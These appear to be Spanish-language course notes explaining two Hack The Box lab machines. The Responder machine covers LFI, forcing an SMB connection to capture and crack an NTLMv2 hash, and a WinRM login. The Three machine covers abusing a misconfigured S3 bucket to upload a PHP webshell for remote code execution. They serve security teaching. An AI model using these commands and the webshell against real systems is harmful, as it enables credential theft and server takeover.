Antes de entrar en materia, Yuba responde una pregunta recurrente del grupo: cómo saber qué protocolo atacar, qué librería usar, qué herramienta conecta con qué servicio. **Conceptos web fundamentales antes de Responder**

Antes de retomar la máquina, Yuba introduce el marco conceptual que faltaba: el modelo cliente-servidor y los parámetros como superficie de ataque.

En cualquier aplicación web hay dos partes. El cliente es todo lo que el usuario ve e interactúa: HTML, CSS, JavaScript, el frontend. El servidor es donde ocurren las operaciones reales: lógica de negocio, acceso a base de datos, API. Cuando el cliente interactúa con la página, lo que ocurre por debajo son peticiones HTTP. Las peticiones **GET** piden información al servidor. Las peticiones **POST** envían información al servidor.

Los **parámetros** son los puntos de entrada de esas peticiones. Son los lugares donde el usuario, o el atacante, introduce datos que el servidor va a procesar. Un parámetro puede aparecer en la URL (?page=french.html), en un formulario, en una cabecera, en muchos sitios. Lo crítico es entender que cada parámetro, dependiendo de para qué lo usa la aplicación, tiene vulnerabilidades potenciales asociadas. Un parámetro que carga archivos puede ser vulnerable a LFI. Un parámetro que construye una consulta a la base de datos puede ser vulnerable a SQL Injection. Los auditores expertos ven un parámetro y ya saben qué probar. Eso también es experiencia.

- **La idea clave:** los parámetros son la principal superficie de ataque en aplicaciones web. No es la URL, no es la página, es el parámetro y lo que hace con lo que le metes

**Responder — NTLM, LFI y envenenamiento de tráfico**

La máquina Responder combina dos vectores: una vulnerabilidad LFI (Local File Inclusion) en un parámetro de la web, y la herramienta Responder para capturar hashes de autenticación NTLM.

**NTLM** es uno de los protocolos de autenticación de Windows. Cuando un equipo Windows intenta acceder a un recurso de red que no encuentra, en vez de rendirse, envía una pregunta en modo broadcast a toda la red: "¿Alguien sabe dónde está este recurso?". En esa pregunta viaja el hash NTLM del proceso que está haciendo la pregunta. Responder se aprovecha de este comportamiento: se hace pasar por un servidor legítimo, responde a esas preguntas en broadcast diciendo "soy yo", la víctima se conecta, y en esa conexión Responder captura el hash.

**LFI** es una vulnerabilidad que ocurre cuando una aplicación tiene un parámetro que carga ficheros del servidor sin validar qué fichero se está cargando. En PHP, la función vulnerable suele ser include(). Si el desarrollador no comprueba el input, el atacante puede usar ../ para navegar hacia atrás en el árbol de directorios y cargar cualquier fichero del sistema.

Confirmar que existe el LFI:

```
http://unika.htb/?page=../../../../../../../../Windows/System32/drivers/etc/hosts
```

Esto carga el fichero de hosts de Windows y lo muestra en pantalla. Confirma que el parámetro page es vulnerable.

La combinación de ambos vectores es el ataque: si el parámetro LFI acepta rutas de red UNC (doble barra), se puede forzar al servidor a hacer una petición SMB a nuestra IP. Windows, al intentar autenticarse contra nuestra máquina, envía el hash NTLM del proceso que está ejecutando el servidor web.

**Por qué es necesaria nuestra IP:** en un entorno de red local, Responder envenenaría cualquier petición broadcast. En HTB no estamos en la misma red local que el servidor, sino conectados por VPN. Por eso hay que forzar la conexión directamente a nuestra IP, para que el servidor haga la petición a nosotros específicamente.

**Por qué se recibe el hash de Administrador:** porque el servidor web (Apache/PHP) se está ejecutando bajo la cuenta de Administrador. Windows envía las credenciales del proceso que origina la conexión. Si el servidor corriera bajo el usuario "Pepe", se recibiría el hash de Pepe.

```
# Lanzar Responder en el adaptador tun0 (VPN de HTB)
sudo responder -I tun0

# En el navegador, forzar la petición SMB a nuestra IP
http://unika.htb/?page=//NUESTRA_IP_TUN0/carpeta_inventada

# El hash NTLMv2 aparece en la consola de Responder
# Guardarlo en un fichero y crackearlo con John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Los hashes capturados por Responder son siempre **NTLMv2**. Esto es importante: los hashes NTLMv2 solo se pueden crackear por fuerza bruta, no se pueden usar directamente para autenticarse (pass-the-hash). Hay otros tipos de hashes NTLM que sí permiten pass-the-hash, pero no este.

Con la contraseña obtenida, se conecta por WinRM (puerto 5985) usando Evil-WinRM:

```
evil-winrm -i IP_OBJETIVO -u administrator -p CONTRASEÑA
```

La flag está en C:\Users\mike\Desktop\flag.txt. En HTB, las flags siempre están en el escritorio del usuario correspondiente.

- **La metáfora útil:** Responder es como el portero de un edificio que responde a cualquiera que pregunte "¿vives aquí?" diciendo que sí, para que el visitante le entregue su tarjeta de identificación antes de llamar al piso real
    
- **La idea clave:** Responder es una herramienta que se usa constantemente en auditorías reales. En entornos corporativos Windows mal configurados, con solo tenerlo levantado en la red van llegando hashes. El vector de ataque no es técnico sofisticado, es que Windows tiene este comportamiento de autenticación por defecto y muchas empresas no lo deshabilitan

**Three — Introducción al Hacking Cloud: AWS S3**

La máquina Three introduce el hacking cloud, uno de los ámbitos más actuales del sector junto con la IA. Los tres grandes proveedores cloud son AWS (Amazon), GCP (Google Cloud Platform) y Azure (Microsoft). La referencia para aprender a atacar entornos cloud es **HackTricks Cloud**, que tiene documentación específica para cada proveedor.

**Conceptos fundamentales de AWS S3:**

AWS S3 (Simple Storage Service) es el servicio de almacenamiento de ficheros de Amazon. No es una base de datos relacional, es un almacén de objetos. Los contenedores donde se guardan los datos se llaman **buckets** (equivalentes a carpetas). Dentro de los buckets hay **objetos** (equivalentes a ficheros). S3 se usa para copias de seguridad, alojar imágenes, distribuir software y, como en esta máquina, alojar páginas web completas.

La metodología de ataque es la misma que siempre: enumerar primero. En este caso, la enumeración de subdominios con GoBuster revela un subdominio s3.thetoppers.htb, que ya de por sí indica que hay un bucket S3 expuesto.

```
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Para interactuar con S3 desde la terminal se usa el cliente de AWS:

```
sudo apt install awscli
aws configure
# AccessKey ID: cualquier valor (test)
# Secret Access Key: cualquier valor (test)
# Region: cualquier valor
# Output: cualquier valor
```

El AWS CLI siempre tiene que estar inicializado con algún valor para funcionar, aunque sean datos inventados. Si el bucket está mal configurado (misconfigured), se podrá acceder sin credenciales reales.

```
# Listar contenido del bucket
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb

# Subir una webshell PHP
aws s3 cp webshell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

El bucket está sirviendo los ficheros de la página web. Por eso, subir una webshell PHP al bucket la hace accesible desde el servidor web. La webshell básica en PHP ejecuta comandos del sistema a través del parámetro cmd:

```
<?php system($_GET['cmd']); ?>
```

Accediendo a [http://thetoppers.htb/webshell.php?cmd=id](http://thetoppers.htb/webshell.php?cmd=id) se confirma la ejecución remota de código.

La vulnerabilidad no está en S3 como servicio, sino en que el administrador que configuró el bucket no restringió los permisos de acceso. Un bucket S3 puede configurarse como público (cualquiera puede leer y escribir), privado (solo la cuenta propietaria) o con permisos granulares por usuario. En este caso, la escritura pública permite subir una webshell y comprometer el servidor completo.

- **La idea clave:** en hacking cloud, los ataques no van contra puertos y servicios, van contra la configuración de los servicios en la nube. La pregunta no es "¿qué versión tiene este servicio?", sino "¿cómo están configurados los permisos de este recurso?"
    
- **La metáfora útil:** un bucket S3 mal configurado es como una taquilla de vestuario sin candado. La taquilla existe, el servicio funciona, pero cualquiera puede abrirla y meter o sacar cosas

Al cerrar esta sesión entendemos Responder a fondo: qué es NTLM, por qué Windows envía hashes en modo broadcast, cómo el LFI permite forzar una conexión SMB a nuestra IP, y por qué recibimos el hash del proceso que ejecuta el servidor y no de cualquier usuario. Entendemos también los fundamentos de AWS S3: buckets como contenedores, objetos como ficheros, el cliente AWS CLI para interactuar desde terminal, y cómo una mala configuración de permisos permite subir una webshell y conseguir ejecución remota de código.
